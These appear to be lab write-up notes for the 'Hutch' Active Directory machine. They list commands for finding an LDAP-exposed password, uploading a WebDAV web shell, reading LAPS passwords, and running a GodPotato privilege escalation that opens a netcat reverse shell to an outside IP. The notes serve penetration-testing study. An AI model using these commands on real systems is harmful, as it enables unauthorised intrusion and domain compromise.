# Hutch: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 5985
- **Web Port**: 80 (IIS 10.0 / WebDAV enabled)
- **Domain**: `hutch.offsec`
- **Host**: `HUTCHDC`

### LDAP Anonymous Bind (Credential Discovery)
1. **Enumeration**:
   ```bash
   ldapsearch -H ldap://10.10.10.10 -x -b "dc=hutch,dc=offsec" "(objectClass=person)"
   ```
2. **Result**: Found user `fmcsorley` with a cleartext password in the description: `CrabSharkJellyfish192`.

---

## Initial Access

### WebDAV Exploitation (cadaver)
1. **Accessing WebDAV**:
   ```bash
   cadaver http://10.10.10.10
   # Use credentials: fmcsorley / CrabSharkJellyfish192
   ```
2. **Uploading Shell**:
   ```bash
   put shell.aspx
   ```
3. **Execution**: Access `http://10.10.10.10/shell.aspx`.
4. **Shell**: Gain initial access as `hutch\fmcsorley`.

---

## Privilege Escalation

### Method 1: LAPS Password Reading
1. **Enumeration** (BloodHound):
   `fmcsorley` has rights to read the LAPS password (`ms-Mcs-AdmPwd`) for `HUTCHDC`.
2. **Execution** (Netexec / pyLAPS):
   ```bash
   netexec smb 10.10.10.10 -u fmcsorley -p 'CrabSharkJellyfish192' --laps
   # OR
   python3 pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192"
   ```
3. **Result**: Obtained Local Administrator password.
4. **Login**: `evil-winrm -i 10.10.10.10 -u administrator -p [LAPS_PASS]`

### Method 2: SeImpersonate Abuse (GodPotato)
1. **Check Privs**: `whoami /priv` shows `SeImpersonatePrivilege` enabled.
2. **Execution**:
   ```powershell
   .\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe -e cmd 172.10.10.10 4444"
   ```
3. **Result**: System shell.
